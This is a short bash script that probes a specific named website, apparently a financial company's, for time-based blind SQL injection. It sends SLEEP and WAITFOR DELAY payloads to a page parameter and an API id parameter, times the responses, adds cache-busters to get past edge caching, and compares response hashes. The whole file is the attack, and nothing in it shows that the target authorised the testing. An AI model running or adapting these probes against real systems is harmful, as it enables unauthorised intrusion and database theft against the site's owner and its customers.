#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
t() { echo -n "$1 -> "; curl -sk -o /dev/null -A "$UA" -w "%{time_total}\n" "$B$1"; }
echo "### time-based blind on page"
t "/?page=2"
t "/?page=2%20AND%20SLEEP(5)"
t "/?page=2%27%20AND%20SLEEP(5)--%20-"
t "/?page=(SELECT%20SLEEP(5))"
t "/?page=2;WAITFOR%20DELAY%20'0:0:5'--"
echo "### cache-buster to defeat edge cache"
t "/?page=2&cb=$(date +%s%N)"
t "/?page=2%20AND%20SLEEP(5)&cb=$(date +%s%N)"
t "/?page=2%27%20AND%20SLEEP(5)---&cb=$(date +%s%N)"
echo "### time-based on /api/?id="
t "/api/?id=1&cb=$(date +%s%N)"
t "/api/?id=1%20AND%20SLEEP(5)&cb=$(date +%s%N)"
echo "### cache-busted body diff"
curl -sk -A "$UA" "$B/?page=2&cb=$(date +%s%N)" -o /tmp/t1
curl -sk -A "$UA" "$B/?page=2%20AND%20SLEEP(5)&cb=$(date +%s%N)" -o /tmp/t2
curl -sk -A "$UA" "$B/?page=9999&cb=$(date +%s%N)" -o /tmp/t3
md5sum /tmp/t1 /tmp/t2 /tmp/t3